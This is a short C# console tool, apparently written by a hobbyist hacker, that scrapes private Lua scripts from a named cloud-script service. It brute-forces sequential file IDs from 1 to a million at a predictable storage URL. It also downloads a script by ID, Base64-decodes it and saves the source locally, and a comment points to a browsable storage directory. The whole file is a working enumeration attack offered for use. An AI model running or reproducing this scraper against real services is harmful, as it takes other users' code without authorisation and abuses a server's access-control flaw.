using System;
using System.Net;
using System.Text;
using System.IO;

/*
*   Private as of: 4/5/2021
*   Made by pwd0kernel - pwdsec
*   Desc: It gets the Lua Script in Base64 Decode it and then show the source. You can also bruteforce it.
*/

namespace CloudScriptScraper
{
    class Program
    {
        static void BruceForce(){
            // this can take forever, so just go here: https://lynx.rip/dashboard/home/cloudscripts/storage/
            // you can also use threading so it goes way faster lol, i juts didn't do it
            for (int i = 1; i <= 1000000; i = i + 1) {
                try {
                    using (var client = new WebClient()) {
                        var data = client.DownloadString($"http://lynx.rip/dashboard/home/cloudscripts/storage/{i}_src.lua"); 
                        Console.WriteLine(data);
                    }
                } catch(Exception) { Console.WriteLine($"Error: {i}"); }
            }
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Commands: brute - BruteForce Scripts");
            if (!Directory.Exists("Scripts"))
                Directory.CreateDirectory("Scripts");

            while (true) {
                Console.Write("[Code]: ");
                string code = Console.ReadLine();

                if (code == "brute") { // low-key useless
                    BruceForce();
                }

                using (var client = new WebClient()) {
                    var data = client.DownloadString($"http://lynx.rip/dashboard/home/cloudscripts/storage/{code}_src.lua");

                    Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String(data)));
                    File.WriteAllText($"Scripts\\{code}_src.lua", Encoding.UTF8.GetString(Convert.FromBase64String(data)));
                    Console.WriteLine($"CloudScript Code: cloudscript({code})()");
                } 
            }
        }
    }
}